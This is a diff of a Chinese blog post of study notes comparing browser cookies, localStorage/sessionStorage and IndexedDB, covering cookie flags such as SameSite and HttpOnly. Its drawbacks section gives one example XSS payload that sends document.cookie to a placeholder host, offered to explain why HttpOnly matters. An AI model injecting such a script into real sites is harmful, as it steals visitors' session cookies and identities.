@@ -1,33 +1,51 @@
-
+---
+layout: post
+title: Cookie, Storage 与 indexDB
+date: 2021-02-05
+---
 # cookie
-目的： 用于识别用户身份。  
-特点： 
-* 4kb
-* 发请求自动带上
-原理： 服务器返回setsCookie时，浏览器会记住cookie, 浏览器发送请求，cookie会被携带给服务器。  
+## 目的
+用于识别用户身份。
+
+## 特点 
+  * 4kb
+  * 发请求自动带上
+
+## 原理
+服务器返回setsCookie时，浏览器会记住cookie, 浏览器发送请求，cookie会被携带给服务器。  
 Cookie 执行同源策略，同一个 host 下的不同端口可以互相访问 Cookie。a与b只能访问自己的cookie，在a中内嵌c网页，并获取c的cookie，此时c cookie是a的第三方cookie。
-** Chrome 更新 80后， SameSite 为`Lax`， 仅允许同站或者子站访问Cookie, 跨站（内嵌c无法访问cookie）需要SameSite `None` **
+**Chrome 更新 80后， SameSite 为`Lax`， 仅允许同站或者子站访问Cookie, 跨站（内嵌c无法访问cookie）需要SameSite `None`**
 Secure：只允许Https setCookie
 HttpOnly： 不允许JS访问ducoment.cookie， 只能由服务器setsCookie
+
 ```
 Set-Cookie: userId=123; SameSite=None; Secure; HttpOnly
 ```
-应用： 多用于广告服务。a通过内嵌网页向c发送请求，c返回cookie；b通过内嵌网页向c发送请求，并携带cookie，c获知用户身份，按喜好投放广告。 
-缺点： 
+
+## 应用
+多用于广告服务。a通过内嵌网页向c发送请求，c返回cookie；b通过内嵌网页向c发送请求，并携带cookie，c获知用户身份，按喜好投放广告。 
+
+## 缺点
+
 XSS攻击： 跨站脚本攻击， 利用用户对网页的信任。不设置HttpOnly，则用户能上传恶意代码，如： `<script>window.open("举个栗子.com?cookie=" + document.cookie</script>`，获取他人的cookie与身份。
 CSRF(Cross-site request forgery): 跨站请求伪造，需要诱导点击，利用<form>跨域发请求，携带cookie，完成非意愿的操作。
 
 # storage
-目的：弥补cookie太小
-特点：
+## 目的
+弥补cookie太小
+## 特点
+
 * 10MB
 * 使用 Key-Value 形式储存， 只能存字符串。
 * 需要调用setItem, getItem, removeItem, clear。
 * 增删改查为同步。
 
 # IndexedDB
-目的：弥补storage只能存字符串
-特点：
+## 目的
+弥补storage只能存字符串
+
+## 特点
+
 * 空间无限制。
 * 能存对象，数字等。
 * 增删改查都是异步。
